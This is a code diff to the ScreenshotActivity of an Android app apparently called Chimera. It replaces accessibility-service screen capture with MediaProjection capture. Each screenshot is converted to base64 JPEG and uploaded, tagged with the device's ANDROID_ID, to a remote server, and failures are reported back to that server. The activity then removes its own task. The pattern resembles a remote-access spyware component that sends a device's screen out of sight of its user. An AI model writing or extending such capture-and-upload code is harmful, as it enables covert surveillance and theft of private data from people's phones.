@@ -1,15 +1,22 @@
 package com.chimera;
 
-import android.accessibilityservice.AccessibilityService;
+import android.content.Context;
+import android.content.Intent;
 import android.graphics.Bitmap;
-import android.hardware.HardwareBuffer;
-import android.os.Build;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.provider.Settings;
 import android.util.Base64;
+import android.util.DisplayMetrics;
 import android.util.Log;
-import android.view.Display;
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import com.android.volley.DefaultRetryPolicy;
 import com.android.volley.Request;
@@ -20,6 +27,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
+import java.nio.ByteBuffer;
 
 public class ScreenshotActivity extends AppCompatActivity {
 
@@ -34,64 +42,74 @@ public class ScreenshotActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         requestQueue = Volley.newRequestQueue(this);
 
-        if (CoreService.getSharedInstance() == null) {
-            submitErrorToServer("Screenshot failed: CoreService is not active.");
+        if (MainActivity.projectionIntent == null) {
+            submitErrorToServer("Screenshot failed: Permission not granted during setup.");
             finishAndRemoveTask();
             return;
         }
         
-        takeScreenshot();
+        startCapture();
     }
-    
-    private void takeScreenshot() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-            submitErrorToServer("Screenshot API requires Android 11+.");
+
+    private void startCapture() {
+        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        MediaProjection mediaProjection = manager.getMediaProjection(MainActivity.projectionResultCode, MainActivity.projectionIntent);
+
+        if (mediaProjection == null) {
+            submitErrorToServer("MediaProjection could not be retrieved.");
             finishAndRemoveTask();
             return;
         }
+        
+        DisplayMetrics metrics = getResources().getDisplayMetrics();
+        int width = metrics.widthPixels;
+        int height = metrics.heightPixels;
+        int density = metrics.densityDpi;
 
-        CoreService service = CoreService.getSharedInstance();
-        service.takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new AccessibilityService.TakeScreenshotCallback() {
-            @Override
-            public void onSuccess(@NonNull AccessibilityService.ScreenshotResult screenshotResult) {
-                HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
-                if (buffer == null) {
-                    submitErrorToServer("Capture returned a null HardwareBuffer.");
-                    finishAndRemoveTask();
-                    return;
+        ImageReader imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+        VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
+                "ChimeraScreenshot",
+                width, height, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                imageReader.getSurface(), null, null);
+
+        imageReader.setOnImageAvailableListener(reader -> {
+            Image image = null;
+            Bitmap bitmap = null;
+            try {
+                image = reader.acquireLatestImage();
+                if (image != null) {
+                    Image.Plane[] planes = image.getPlanes();
+                    ByteBuffer buffer = planes[0].getBuffer();
+                    int pixelStride = planes[0].getPixelStride();
+                    int rowStride = planes[0].getRowStride();
+                    int rowPadding = rowStride - pixelStride * width;
+
+                    bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
+                    bitmap.copyPixelsFromBuffer(buffer);
+
+                    // Crop the padding out of the bitmap
+                    Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
+                    
+                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
+                    croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
+                    String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
+                    uploadFileToServer("screenshot", encodedImage);
+
+                    croppedBitmap.recycle();
                 }
-                
-                final Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
-                buffer.close();
-                
-                if (bitmap != null) {
-                    processAndUploadBitmap(bitmap);
-                } else {
-                    submitErrorToServer("Bitmap creation from HardwareBuffer failed.");
-                    finishAndRemoveTask();
-                }
-            }
-            @Override
-            public void onFailure(int errorCode) {
-                submitErrorToServer("Native capture failed with code: " + errorCode);
+            } catch (Exception e) {
+                submitErrorToServer("Image processing failed: " + e.getMessage());
+            } finally {
+                if (bitmap != null) bitmap.recycle();
+                if (image != null) image.close();
+                if (virtualDisplay != null) virtualDisplay.release();
+                if (mediaProjection != null) mediaProjection.stop();
                 finishAndRemoveTask();
             }
-        });
+        }, new Handler(Looper.getMainLooper()));
     }
     
-    private void processAndUploadBitmap(Bitmap bitmap) {
-        try {
-            ByteArrayOutputStream stream = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
-            String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
-            uploadFileToServer("screenshot", encodedImage);
-        } catch (Exception e) {
-            submitErrorToServer("Bitmap processing failed: " + e.getMessage());
-        } finally {
-            finishAndRemoveTask();
-        }
-    }
-
     private void uploadFileToServer(String dataType, String base64Data) {
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         JSONObject postData = new JSONObject();
